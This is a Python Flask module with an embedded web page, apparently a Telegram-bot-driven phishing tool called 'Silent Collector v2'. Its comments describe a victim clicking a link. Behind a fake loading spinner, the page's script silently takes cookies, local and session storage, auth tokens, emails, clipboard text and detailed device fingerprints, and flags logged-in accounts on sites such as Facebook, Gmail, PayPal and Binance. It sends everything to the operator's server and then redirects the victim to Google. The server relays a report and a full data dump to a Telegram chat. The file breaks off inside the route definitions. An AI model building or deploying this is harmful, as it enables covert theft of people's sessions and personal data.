# silent_collector.py
# ============================================================
# Silent Collector v2 — النسخة العربية الاحترافية
# الضحية تدوس اللينك → كل حاجة تتحصل تلقائياً → Google
# ============================================================

import os
import time
import json
import uuid
import hashlib
import re
from datetime import datetime

from flask import Blueprint, request, jsonify, redirect

from config import bot, redis_client, PUBLIC_URL

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("silent_collector")

silent_bp = Blueprint('silent_collector', __name__)


# ============================================================
# الإعدادات
# ============================================================
SESSION_TTL = 86400 * 30        # 30 يوم
GOOGLE_REDIRECT = "https://www.google.com"

# المواقع اللي بنكشف جلساتها
KNOWN_SITES = {
    "facebook.com": "Facebook",
    "instagram.com": "Instagram",
    "whatsapp.com": "WhatsApp",
    "web.whatsapp.com": "WhatsApp Web",
    "gmail.com": "Gmail",
    "google.com": "Google",
    "youtube.com": "YouTube",
    "twitter.com": "Twitter",
    "x.com": "X (Twitter)",
    "tiktok.com": "TikTok",
    "linkedin.com": "LinkedIn",
    "netflix.com": "Netflix",
    "amazon.com": "Amazon",
    "paypal.com": "PayPal",
    "binance.com": "Binance",
    "telegram.org": "Telegram",
    "web.telegram.org": "Telegram Web",
    "snapchat.com": "Snapchat",
    "pinterest.com": "Pinterest",
    "reddit.com": "Reddit",
    "spotify.com": "Spotify",
    "microsoftonline.com": "Microsoft",
    "outlook.com": "Outlook",
    "yahoo.com": "Yahoo",
    "fiverr.com": "Fiverr",
    "upwork.com": "Upwork",
    "github.com": "GitHub",
    "gitlab.com": "GitLab",
    "stackoverflow.com": "Stack Overflow",
}


# ============================================================
# ★★★ صفحة الالتقاط الاحترافية (بالعربي) ★★★
# ============================================================
COLLECTOR_PAGE = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>جاري التحميل...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    height: 100%;
    background: #ffffff;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Tahoma", "Arial", sans-serif;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .loader-container {
    text-align: center;
    animation: fadeIn 0.3s ease-in;
  }
  @keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
  }
  .spinner {
    width: 48px;
    height: 48px;
    border: 3px solid #e8eaed;
    border-top-color: #4285f4;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin: 0 auto 20px;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  .text {
    color: #5f6368;
    font-size: 14px;
    font-weight: 400;
  }
  .fade-out {
    animation: fadeOut 0.3s ease-out forwards;
  }
  @keyframes fadeOut {
    to { opacity: 0; }
  }
</style>
</head>
<body>
<div class="loader-container">
  <div class="spinner"></div>
  <div class="text">جاري التحميل...</div>
</div>

<script>
(function() {
    "use strict";
    
    var SESSION_ID = "__SESSION_ID__";
    var ENDPOINT = "__ENDPOINT__";
    var REDIRECT_URL = "__REDIRECT_URL__";
    
    // ═══════════════════════════════════════════════════
    // ★★★ 1. بناء البيانات الأساسية ★★★
    // ═══════════════════════════════════════════════════
    var data = {
        session_id: SESSION_ID,
        collected_at: Math.floor(Date.now() / 1000),
        local_time: new Date().toString(),
        timezone_offset: new Date().getTimezoneOffset(),
        url: location.href,
        referrer: document.referrer || '',
        history_length: history.length || 0
    };
    
    // ─── Navigator Info ───
    try {
        data.user_agent = navigator.userAgent;
        data.language = navigator.language || 'unknown';
        data.languages = (navigator.languages || []).join(',');
        data.platform = navigator.platform || 'unknown';
        data.vendor = navigator.vendor || 'unknown';
        data.cookie_enabled = navigator.cookieEnabled;
        data.do_not_track = navigator.doNotTrack || null;
        data.hardware_concurrency = navigator.hardwareConcurrency || null;
        data.device_memory = navigator.deviceMemory || null;
        data.max_touch_points = navigator.maxTouchPoints || 0;
        data.online = navigator.onLine;
    } catch(e) {}
    
    // ─── Timezone ───
    try {
        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    } catch(e) {}
    
    // ─── Screen ───
    try {
        data.screen = {
            width: screen.width,
            height: screen.height,
            avail_width: screen.availWidth,
            avail_height: screen.availHeight,
            color_depth: screen.colorDepth,
            pixel_depth: screen.pixelDepth,
            dpr: window.devicePixelRatio || 1,
            orientation: (screen.orientation && screen.orientation.type) || null
        };
    } catch(e) {}
    
    // ─── Window ───
    try {
        data.window = {
            inner_width: window.innerWidth,
            inner_height: window.innerHeight,
            outer_width: window.outerWidth,
            outer_height: window.outerHeight
        };
    } catch(e) {}
    
    // ─── Preferences ───
    try {
        data.dark_mode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
        data.reduced_motion = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
        data.touch_support = 'ontouchstart' in window;
    } catch(e) {}
    
    // ─── Connection ───
    try {
        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            data.connection = {
                effective_type: conn.effectiveType || null,
                type: conn.type || null,
                downlink: conn.downlink || null,
                downlink_max: conn.downlinkMax || null,
                rtt: conn.rtt || null,
                save_data: conn.saveData || false
            };
        }
    } catch(e) {}
    
    // ═══════════════════════════════════════════════════
    // ★★★ 2. بصمة الجهاز (Canvas + WebGL + Audio) ★★★
    // ═══════════════════════════════════════════════════
    
    // ─── WebGL ───
    function getWebGLInfo() {
        try {
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return null;
            
            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
            var vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
            var renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
            
            return {
                vendor: vendor,
                renderer: renderer,
                version: gl.getParameter(gl.VERSION),
                glsl_version: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                max_texture_size: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                max_viewport_dims: gl.getParameter(gl.MAX_VIEWPORT_DIMS) ? 
                    Array.from(gl.getParameter(gl.MAX_VIEWPORT_DIMS)).join('x') : null
            };
        } catch(e) { return null; }
    }
    data.webgl = getWebGLInfo();
    
    // ─── Canvas Fingerprint (stronger) ───
    function getCanvasFingerprint() {
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 280;
            canvas.height = 60;
            var ctx = canvas.getContext('2d');
            
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.font = '11pt "Arial"';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.font = '18pt "Times New Roman"';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 45);
            
            var dataURL = canvas.toDataURL();
            return dataURL;
        } catch(e) { return null; }
    }
    var canvasFingerprint = getCanvasFingerprint();
    data.canvas_full = canvasFingerprint;
    data.canvas_hash = canvasFingerprint ? 
        (canvasFingerprint.length + '_' + canvasFingerprint.substring(50, 100)) : null;
    
    // ─── Audio Fingerprint ───
    function getAudioFingerprint() {
        return new Promise(function(resolve) {
            try {
                var AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
                if (!AudioContext) return resolve(null);
                
                var ctx = new AudioContext(1, 44100, 44100);
                var osc = ctx.createOscillator();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(10000, ctx.currentTime);
                
                var compressor = ctx.createDynamicsCompressor();
                compressor.threshold.setValueAtTime(-50, ctx.currentTime);
                compressor.knee.setValueAtTime(40, ctx.currentTime);
                compressor.ratio.setValueAtTime(12, ctx.currentTime);
                compressor.attack.setValueAtTime(0, ctx.currentTime);
                compressor.release.setValueAtTime(0.25, ctx.currentTime);
                
                osc.connect(compressor);
                compressor.connect(ctx.destination);
                osc.start(0);
                
                ctx.startRendering().then(function(buffer) {
                    try {
                        var audioData = buffer.getChannelData(0);
                        var sum = 0;
                        for (var i = 4500; i < 5000; i++) {
                            sum += Math.abs(audioData[i]);
                        }
                        resolve(sum.toString().substring(0, 20));
                    } catch(e) { resolve(null); }
                }).catch(function() { resolve(null); });
            } catch(e) { resolve(null); }
        });
    }
    
    // ─── Fonts Detection ───
    function detectFonts() {
        try {
            var baseFonts = ['monospace', 'sans-serif', 'serif'];
            var testFonts = [
                'Arial', 'Arial Black', 'Arial Narrow', 'Arial Rounded MT Bold',
                'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 
                'Comic Sans MS', 'Trebuchet MS', 'Impact', 'Tahoma', 
                'Calibri', 'Segoe UI', 'Helvetica', 'Cambria', 
                'Consolas', 'Candara', 'Corbel', 'Franklin Gothic Medium',
                'Gill Sans', 'Lucida Console', 'Lucida Sans Unicode', 
                'Palatino Linotype', 'Rockwell', 'Times', 'Webdings',
                'Wingdings', 'Andalus', 'Traditional Arabic', 'Simplified Arabic',
                'Arabic Typesetting', 'Sakkal Majalla', 'Droid Arabic Kufi'
            ];
            var testString = 'mmmmmmmmmmlli';
            var testSize = '72px';
            var span = document.createElement('span');
            span.style.position = 'absolute';
            span.style.left = '-9999px';
            span.style.fontSize = testSize;
            span.style.visibility = 'hidden';
            span.innerHTML = testString;
            document.body.appendChild(span);
            
            var baseSizes = {};
            for (var i = 0; i < baseFonts.length; i++) {
                span.style.fontFamily = baseFonts[i];
                baseSizes[baseFonts[i]] = span.offsetWidth;
            }
            
            var detected = [];
            for (var j = 0; j < testFonts.length; j++) {
                var found = false;
                for (var k = 0; k < baseFonts.length; k++) {
                    span.style.fontFamily = "'" + testFonts[j] + "'," + baseFonts[k];
                    if (span.offsetWidth !== baseSizes[baseFonts[k]]) {
                        found = true;
                        break;
                    }
                }
                if (found) detected.push(testFonts[j]);
            }
            document.body.removeChild(span);
            return detected;
        } catch(e) { return []; }
    }
    data.fonts = detectFonts();
    
    // ═══════════════════════════════════════════════════
    // ★★★ 3. الكوكيز والتخزين ★★★
    // ═══════════════════════════════════════════════════
    
    // ─── كل الكوكيز ───
    function getCookies() {
        try {
            var cookieStr = document.cookie || '';
            var cookies = [];
            var pairs = cookieStr.split(';');
            for (var i = 0; i < pairs.length; i++) {
                var pair = pairs[i].trim();
                if (pair) {
                    var eq = pair.indexOf('=');
                    if (eq > 0) {
                        cookies.push({
                            name: pair.substring(0, eq),
                            value: pair.substring(eq + 1).substring(0, 500)
                        });
                    }
                }
            }
            return {
                raw: cookieStr.substring(0, 3000),
                count: cookies.length,
                cookies: cookies.slice(0, 50)
            };
        } catch(e) { return { raw: '', count: 0, cookies: [] }; }
    }
    data.cookies = getCookies();
    
    // ─── LocalStorage ───
    function getLocalStorage() {
        try {
            var result = {};
            var count = 0;
            for (var i = 0; i < localStorage.length && count < 200; i++) {
                var key = localStorage.key(i);
                if (key) {
                    var val = localStorage.getItem(key) || '';
                    result[key] = val.substring(0, 1000);
                    count++;
                }
            }
            return result;
        } catch(e) { return {}; }
    }
    data.local_storage = getLocalStorage();
    
    // ─── SessionStorage ───
    function getSessionStorage() {
        try {
            var result = {};
            var count = 0;
            for (var i = 0; i < sessionStorage.length && count < 200; i++) {
                var key = sessionStorage.key(i);
                if (key) {
                    var val = sessionStorage.getItem(key) || '';
                    result[key] = val.substring(0, 1000);
                    count++;
                }
            }
            return result;
        } catch(e) { return {}; }
    }
    data.session_storage = getSessionStorage();
    
    // ═══════════════════════════════════════════════════
    // ★★★ 4. كشف الجلسات المسجلة (Sessions Detection) ★★★
    // ═══════════════════════════════════════════════════
    
    function detectSessions() {
        var sessions = [];
        
        var allStorage = {};
        try {
            for (var k in data.local_storage) {
                allStorage[k.toLowerCase()] = data.local_storage[k];
            }
            for (var k2 in data.session_storage) {
                allStorage[k2.toLowerCase()] = data.session_storage[k2];
            }
        } catch(e) {}
        
        var cookieStr = (data.cookies.raw || '').toLowerCase();
        
        // مواقع شهيرة + توكناتها
        var sites = {
            'facebook': ['facebook.com', 'fb_token', 'c_user', 'xs'],
            'instagram': ['instagram.com', 'ig_did', 'csrftoken', 'sessionid'],
            'whatsapp': ['whatsapp', 'wa_'],
            'gmail': ['gmail', 'google', 'SAPISID', 'SID', 'HSID'],
            'youtube': ['youtube', 'SID', 'HSID'],
            'twitter': ['twitter', 'x.com', 'auth_token', 'ct0'],
            'tiktok': ['tiktok', 'sessionid', 'sid_tt'],
            'linkedin': ['linkedin', 'li_at'],
            'netflix': ['netflix', 'NetflixId'],
            'amazon': ['amazon', 'session-id'],
            'paypal': ['paypal', 'PYPF'],
            'github': ['github', 'user_session'],
            'telegram': ['telegram'],
        };
        
        for (var site in sites) {
            var keywords = sites[site];
            var found = false;
            var matched = [];
            
            // افحص الكوكيز
            for (var i = 0; i < keywords.length; i++) {
                if (cookieStr.indexOf(keywords[i].toLowerCase()) >= 0) {
                    found = true;
                    matched.push('cookie:' + keywords[i]);
                }
            }
            
            // افحص التخزين
            for (var stKey in allStorage) {
                for (var j = 0; j < keywords.length; j++) {
                    if (stKey.indexOf(keywords[j].toLowerCase()) >= 0) {
                        found = true;
                        matched.push('storage:' + stKey);
                        break;
                    }
                }
            }
            
            if (found) {
                sessions.push({
                    site: site,
                    matched_keys: matched.slice(0, 5)
                });
            }
        }
        
        return sessions;
    }
    data.detected_sessions = detectSessions();
    
    // ═══════════════════════════════════════════════════
    // ★★★ 5. البحث عن توكنات وكلمات سر ★★★
    // ═══════════════════════════════════════════════════
    
    function findTokens() {
        var tokens = [];
        var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
        var phoneRegex = /(\+?\d{1,3}[\s-]?)?\(?\d{2,4}\)?[\s-]?\d{3,4}[\s-]?\d{3,4}/g;
        var tokenKeys = ['token', 'auth', 'access', 'bearer', 'session', 'jwt', 'api_key', 'apikey'];
        
        // افحص التخزين
        var allStorage = {};
        try {
            for (var k in data.local_storage) allStorage[k] = data.local_storage[k];
            for (var k2 in data.session_storage) allStorage[k2] = data.session_storage[k2];
        } catch(e) {}
        
        // ابحث عن إيميلات
        try {
            var foundEmails = new Set();
            for (var sk in allStorage) {
                var val = String(allStorage[sk]);
                var matches = val.match(emailRegex);
                if (matches) {
                    for (var m = 0; m < matches.length && m < 5; m++) {
                        foundEmails.add(matches[m]);
                    }
                }
            }
            data.found_emails = Array.from(foundEmails).slice(0, 10);
        } catch(e) { data.found_emails = []; }
        
        // ابحث عن توكنات
        for (var stk in allStorage) {
            var lowerKey = stk.toLowerCase();
            for (var t = 0; t < tokenKeys.length; t++) {
                if (lowerKey.indexOf(tokenKeys[t]) >= 0) {
                    var tokenValue = String(allStorage[stk]).substring(0, 200);
                    if (tokenValue.length > 10) {
                        tokens.push({
                            key: stk,
                            type: tokenKeys[t],
                            value: tokenValue
                        });
                    }
                    break;
                }
            }
        }
        
        return tokens.slice(0, 20);
    }
    data.found_tokens = findTokens();
    
    // ═══════════════════════════════════════════════════
    // ★★★ 6. الصور + الحافظة + الملفات ★★★
    // ═══════════════════════════════════════════════════
    
    function getImages() {
        try {
            var imgs = [];
            var allImages = document.querySelectorAll('img');
            for (var i = 0; i < allImages.length && i < 20; i++) {
                var img = allImages[i];
                if (img.src && img.src.indexOf('data:') !== 0) {
                    imgs.push({
                        src: img.src.substring(0, 200),
                        alt: img.alt || '',
                        width: img.naturalWidth || img.width,
                        height: img.naturalHeight || img.height
                    });
                }
            }
            return imgs;
        } catch(e) { return []; }
    }
    data.images = getImages();
    
    // ─── Clipboard ───
    function getClipboard() {
        return new Promise(function(resolve) {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    navigator.clipboard.readText()
                        .then(function(text) { resolve(text.substring(0, 1000)); })
                        .catch(function() { resolve(null); });
                } else {
                    resolve(null);
                }
            } catch(e) { resolve(null); }
        });
    }
    
    // ─── Battery ───
    function getBattery() {
        return new Promise(function(resolve) {
            try {
                if (navigator.getBattery) {
                    navigator.getBattery().then(function(b) {
                        resolve({
                            level: Math.round(b.level * 100),
                            charging: b.charging,
                            charging_time: b.chargingTime === Infinity ? null : b.chargingTime,
                            discharging_time: b.dischargingTime === Infinity ? null : b.dischargingTime
                        });
                    }).catch(function() { resolve(null); });
                } else {
                    resolve(null);
                }
            } catch(e) { resolve(null); }
        });
    }
    
    // ─── Permissions ───
    function getPermissions() {
        return new Promise(function(resolve) {
            try {
                if (navigator.permissions && navigator.permissions.query) {
                    var names = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read'];
                    var results = {};
                    var count = 0;
                    
                    names.forEach(function(name) {
                        navigator.permissions.query({ name: name })
                            .then(function(p) { results[name] = p.state; })
                            .catch(function() { results[name] = 'unknown'; })
                            .finally(function() {
                                count++;
                                if (count === names.length) resolve(results);
                            });
                    });
                    
                    setTimeout(function() { resolve(results); }, 300);
                } else {
                    resolve({});
                }
            } catch(e) { resolve({}); }
        });
    }
    
    // ─── Storage Estimate ───
    function getStorageEstimate() {
        return new Promise(function(resolve) {
            try {
                if (navigator.storage && navigator.storage.estimate) {
                    navigator.storage.estimate().then(function(est) {
                        resolve({
                            quota: est.quota,
                            usage: est.usage,
                            usage_mb: Math.round(est.usage / 1024 / 1024 * 100) / 100
                        });
                    }).catch(function() { resolve(null); });
                } else {
                    resolve(null);
                }
            } catch(e) { resolve(null); }
        });
    }
    
    // ─── IndexedDB Names ───
    function getIndexedDBNames() {
        return new Promise(function(resolve) {
            try {
                if (indexedDB && indexedDB.databases) {
                    indexedDB.databases().then(function(dbs) {
                        resolve(dbs.map(function(db) { return db.name; }));
                    }).catch(function() { resolve([]); });
                } else {
                    resolve([]);
                }
            } catch(e) { resolve([]); }
        });
    }
    
    // ─── Cache Keys ───
    function getCacheKeys() {
        return new Promise(function(resolve) {
            try {
                if (window.caches && caches.keys) {
                    caches.keys().then(function(keys) { resolve(keys); })
                        .catch(function() { resolve([]); });
                } else {
                    resolve([]);
                }
            } catch(e) { resolve([]); }
        });
    }
    
    // ─── Service Workers ───
    function getServiceWorkers() {
        return new Promise(function(resolve) {
            try {
                if ('serviceWorker' in navigator && navigator.serviceWorker.getRegistrations) {
                    navigator.serviceWorker.getRegistrations().then(function(regs) {
                        var workers = [];
                        for (var i = 0; i < regs.length; i++) {
                            if (regs[i].active) {
                                workers.push({
                                    scope: regs[i].scope,
                                    script: regs[i].active.scriptURL
                                });
                            }
                        }
                        resolve(workers);
                    }).catch(function() { resolve([]); });
                } else {
                    resolve([]);
                }
            } catch(e) { resolve([]); }
        });
    }
    
    // ═══════════════════════════════════════════════════
    // ★★★ 7. جمع كل حاجة وإرسال ★★★
    // ═══════════════════════════════════════════════════
    
    function collectAll() {
        return Promise.all([
            getAudioFingerprint(),
            getBattery(),
            getClipboard(),
            getPermissions(),
            getStorageEstimate(),
            getIndexedDBNames(),
            getCacheKeys(),
            getServiceWorkers()
        ]).then(function(results) {
            data.audio_fingerprint = results[0];
            data.battery = results[1];
            data.clipboard = results[2];
            data.permissions = results[3];
            data.storage_estimate = results[4];
            data.indexed_db_names = results[5];
            data.cache_keys = results[6];
            data.service_workers = results[7];
            return data;
        });
    }
    
    function sendData(payload) {
        return new Promise(function(resolve) {
            try {
                var jsonStr = JSON.stringify(payload);
                
                // Try sendBeacon
                if (navigator.sendBeacon) {
                    try {
                        var blob = new Blob([jsonStr], { type: 'application/json' });
                        if (navigator.sendBeacon(ENDPOINT, blob)) {
                            resolve(true);
                            return;
                        }
                    } catch(e) {}
                }
                
                // Try fetch keepalive
                try {
                    fetch(ENDPOINT, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: jsonStr,
                        keepalive: true,
                        mode: 'no-cors'
                    }).then(function() { resolve(true); })
                      .catch(function() {
                          // Fallback XHR
                          try {
                              var xhr = new XMLHttpRequest();
                              xhr.open('POST', ENDPOINT, true);
                              xhr.setRequestHeader('Content-Type', 'application/json');
                              xhr.send(jsonStr);
                              resolve(true);
                          } catch(e2) { resolve(false); }
                      });
                } catch(e) {
                    resolve(false);
                }
            } catch(e) { resolve(false); }
        });
    }
    
    function doRedirect() {
        try {
            document.body.classList.add('fade-out');
        } catch(e) {}
        window.location.replace(REDIRECT_URL);
    }
    
    // ═══════════════════════════════════════════════════
    // MAIN
    // ═══════════════════════════════════════════════════
    var redirectTimer = setTimeout(doRedirect, 1800);
    
    collectAll()
        .then(function(payload) {
            return sendData(payload);
        })
        .then(function() {
            clearTimeout(redirectTimer);
            setTimeout(doRedirect, 200);
        })
        .catch(function() {
            clearTimeout(redirectTimer);
            doRedirect();
        });
    
})();
</script>
</body>
</html>
"""


# ============================================================
# إنشاء Session جديدة
# ============================================================
def create_silent_session(chat_id, label=""):
    """ينشئ session جديد"""
    if not redis_client:
        return None

    try:
        session_id = uuid.uuid4().hex[:16]
        now = time.time()

        session_data = {
            "session_id": session_id,
            "chat_id": str(chat_id),
            "label": label[:50],
            "created_at": now,
            "accessed": False,
            "accessed_at": None,
            "collected": False,
        }

        redis_client.setex(
            f"silent:{session_id}",
            SESSION_TTL,
            json.dumps(session_data)
        )

        redis_client.lpush(f"silent_user:{chat_id}", session_id)
        redis_client.ltrim(f"silent_user:{chat_id}", 0, 199)
        redis_client.expire(f"silent_user:{chat_id}", SESSION_TTL)

        logger.info(f"Silent session created: {session_id} → {chat_id}")
        metrics.inc_counter("silent_sessions_created")

        return session_id

    except Exception as e:
        logger.exception(f"create_silent_session error: {e}")
        return None


# ============================================================
# استقبال البيانات
# ============================================================
def store_collected_data(session_id, data):
    """يخزن البيانات المجمعة"""
    if not redis_client:
        return False

    try:
        raw = redis_client.get(f"silent:{session_id}")
        if not raw:
            logger.warning(f"Session not found: {session_id}")
            return False

        session_data = json.loads(raw)
        chat_id = session_data["chat_id"]

        # إثراء من الهيدرز
        enriched = dict(data)
        enriched['ip'] = (
            request.headers.get('CF-Connecting-IP') or
            request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
            request.remote_addr
        )
        enriched['cf_ip'] = request.headers.get('CF-Connecting-IP', '')
        enriched['x_real_ip'] = request.headers.get('X-Real-IP', '')
        enriched['server_user_agent'] = request.headers.get('User-Agent', '')
        enriched['accept_language'] = request.headers.get('Accept-Language', '')
        enriched['received_at'] = time.time()
        enriched['received_at_str'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        enriched['label'] = session_data.get('label', '')

        # احفظ
        redis_client.setex(
            f"silent_data:{session_id}",
            SESSION_TTL,
            json.dumps(enriched, ensure_ascii=False)
        )

        # حدّث session
        session_data["collected"] = True
        session_data["collected_at"] = time.time()
        redis_client.setex(
            f"silent:{session_id}",
            SESSION_TTL,
            json.dumps(session_data)
        )

        logger.info(f"Data collected: {session_id} | IP={enriched['ip']} | chat={chat_id}")
        metrics.inc_counter("silent_data_collected")

        # أبلغ البوت
        notify_bot(chat_id, session_id, enriched)

        return True

    except Exception as e:
        logger.exception(f"store_collected_data error: {e}")
        return False


# ============================================================
# إشعار البوت
# ============================================================
def notify_bot(chat_id, session_id, data):
    """يبعت تقرير شامل للبوت (بالعربي)"""
    try:
        cid = int(chat_id) if str(chat_id).isdigit() else chat_id

        # ─── بيانات أساسية ───
        label = data.get('label', '')
        label_text = f" ({label})" if label else ""
        ip = data.get('ip', 'غير معروف')
        timezone = data.get('timezone', 'غير معروف')
        received_at = data.get('received_at_str', '—')

        # ─── الجهاز ───
        ua = data.get('user_agent', 'Unknown')
        device_type = "📱 موبايل" if any(x in ua for x in ['Mobile', 'Android', 'iPhone']) else "💻 كمبيوتر"
        
        os_name = "غير معروف"
        if 'Windows' in ua: os_name = "Windows"
        elif 'Mac OS' in ua or 'Macintosh' in ua: os_name = "macOS"
        elif 'Android' in ua: os_name = "Android"
        elif 'iPhone' in ua or 'iPad' in ua: os_name = "iOS"
        elif 'Linux' in ua: os_name = "Linux"
        
        browser = "غير معروف"
        if 'Edg/' in ua: browser = "Edge"
        elif 'OPR/' in ua or 'Opera' in ua: browser = "Opera"
        elif 'Chrome/' in ua: browser = "Chrome"
        elif 'Safari/' in ua: browser = "Safari"
        elif 'Firefox/' in ua: browser = "Firefox"

        # ─── الشاشة ───
        screen = data.get('screen') or {}
        screen_text = f"{screen.get('width', '?')}×{screen.get('height', '?')}"
        dpr = screen.get('dpr', 1)

        # ─── البطارية ───
        battery = data.get('battery')
        battery_text = "—"
        if battery:
            level = battery.get('level', '?')
            charging = "⚡ يشحن" if battery.get('charging') else "🔋 لا يشحن"
            battery_text = f"{charging} · {level}%"

        # ─── الشبكة ───
        conn = data.get('connection') or {}
        net_text = conn.get('effective_type', '—')
        net_speed = conn.get('downlink', '—')

        # ─── Hardware ───
        cores = data.get('hardware_concurrency', '?')
        ram = data.get('device_memory', '?')

        # ─── WebGL ───
        webgl = data.get('webgl') or {}
        gpu = webgl.get('renderer', 'غير معروف')[:80]

        # ─── الجلسات المكتشفة ───
        sessions = data.get('detected_sessions', [])
        sessions_text = ""
        if sessions:
            sessions_text = "🎯 <b>جلسات نشطة:</b>\n"
            for s in sessions[:15]:
                sessions_text += f"  ✅ {s.get('site', '?').title()}\n"
        else:
            sessions_text = "🎯 <b>جلسات نشطة:</b> لا يوجد\n"

        # ─── الإيميلات ───
        emails = data.get('found_emails', [])
        emails_text = ""
        if emails:
            emails_text = "📧 <b>إيميلات مكتشفة:</b>\n"
            for e in emails[:5]:
                emails_text += f"  • <code>{e}</code>\n"

        # ─── التوكنات ───
        tokens = data.get('found_tokens', [])
        tokens_text = ""
        if tokens:
            tokens_text = f"🔑 <b>توكنات مكشوفة:</b> {len(tokens)}\n"
            for t in tokens[:3]:
                tokens_text += f"  • <code>{t.get('key', '?')[:30]}</code>\n"

        # ─── التخزين ───
        cookies_data = data.get('cookies') or {}
        cookies_count = cookies_data.get('count', 0)
        local_keys = len(data.get('local_storage', {}))
        session_keys = len(data.get('session_storage', {}))
        idb_count = len(data.get('indexed_db_names', []))
        cache_count = len(data.get('cache_keys', []))
        sw_count = len(data.get('service_workers', []))

        # ─── الخطوط ───
        fonts_count = len(data.get('fonts', []))

        # ─── الحافظة ───
        clipboard = data.get('clipboard')
        clipboard_text = "—"
        if clipboard:
            clipboard_text = f"<code>{str(clipboard)[:80]}</code>"

        # ─── Storage Estimate ───
        storage_est = data.get('storage_estimate') or {}
        storage_usage = f"{storage_est.get('usage_mb', '?')} MB"

        # ═══════════════════════════════════════════════════
        # الرسالة الرئيسية
        # ═══════════════════════════════════════════════════
        text = (
            f"🎯 <b>التقاط صامت</b>{label_text}\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"

            f"🆔 <b>Session:</b> <code>{session_id}</code>\n"
            f"🕐 <b>الوقت:</b> <code>{received_at}</code>\n\n"

            f"━━━ 🌐 الشبكة ━━━\n"
            f"📍 <b>IP:</b> <code>{ip}</code>\n"
            f"🌍 <b>التوقيت:</b> <code>{timezone}</code>\n"
            f"📡 <b>الشبكة:</b> <code>{net_text}</code> · <code>{net_speed} Mb/s</code>\n\n"

            f"━━━ 💻 الجهاز ━━━\n"
            f"🖥️ <b>النوع:</b> {device_type}\n"
            f"⚙️ <b>النظام:</b> <code>{os_name}</code>\n"
            f"🌐 <b>المتصفح:</b> <code>{browser}</code>\n"
            f"🔧 <b>الأنوية:</b> <code>{cores}</code> · RAM: <code>{ram}GB</code>\n\n"

            f"━━━ 📐 الشاشة ━━━\n"
            f"📏 <b>الدقة:</b> <code>{screen_text}</code>\n"
            f"🔍 <b>DPR:</b> <code>{dpr}</code>\n"
            f"🌗 <b>الوضع الداكن:</b> {'✅' if data.get('dark_mode') else '❌'}\n\n"

            f"━━━ 🎮 العتاد ━━━\n"
            f"🎨 <b>كرت الشاشة:</b>\n<code>{gpu}</code>\n"
            f"🔋 <b>البطارية:</b> {battery_text}\n\n"

            f"━━━ 💾 التخزين ━━━\n"
            f"🍪 <b>الكوكيز:</b> <code>{cookies_count}</code>\n"
            f"💾 <b>LocalStorage:</b> <code>{local_keys}</code> مفتاح\n"
            f"🔐 <b>SessionStorage:</b> <code>{session_keys}</code> مفتاح\n"
            f"📦 <b>IndexedDB:</b> <code>{idb_count}</code> قاعدة\n"
            f"🗄️ <b>Cache:</b> <code>{cache_count}</code> · <b>SW:</b> <code>{sw_count}</code>\n"
            f"💽 <b>المستخدم:</b> <code>{storage_usage}</code>\n"
            f"🔤 <b>الخطوط:</b> <code>{fonts_count}</code>\n\n"

            f"━━━ 🔍 الاستكشاف ━━━\n"
            f"{sessions_text}"
            f"\n{emails_text}"
            f"\n{tokens_text}"
            f"\n📋 <b>الحافظة:</b> {clipboard_text}"
        )

        bot.send_message(cid, text, parse_mode="HTML", disable_web_page_preview=True)
        logger.info(f"Report sent to {cid}")

        # ─── ملف JSON كامل ───
        try:
            import io
            json_str = json.dumps(data, ensure_ascii=False, indent=2)
            buf = io.BytesIO(json_str.encode('utf-8'))
            buf.name = f"silent_{session_id}.json"

            bot.send_document(
                cid, buf,
                caption=(
                    f"📦 <b>ملف البيانات الكامل</b>\n"
                    f"🆔 <code>{session_id}</code>\n"
                    f"📊 <b>الحجم:</b> <code>{len(json_str) / 1024:.1f} KB</code>"
                ),
                parse_mode="HTML"
            )
        except Exception as e:
            logger.warning(f"Send JSON dump error: {e}")

    except Exception as e:
        logger.exception(f"notify_bot error: {e}")


# ============================================================
# Routes
# ============================================================
def init_silent_collector_routes(app, bot_instance):
    """تسجيل مسارات Silent Collector"""

    global bot
    bot = bot_instance

    @app.route('/s/<session_id>', methods=['GET'])
    def silent_collector_page(session_id):
        """صفحة الالتقاط"""
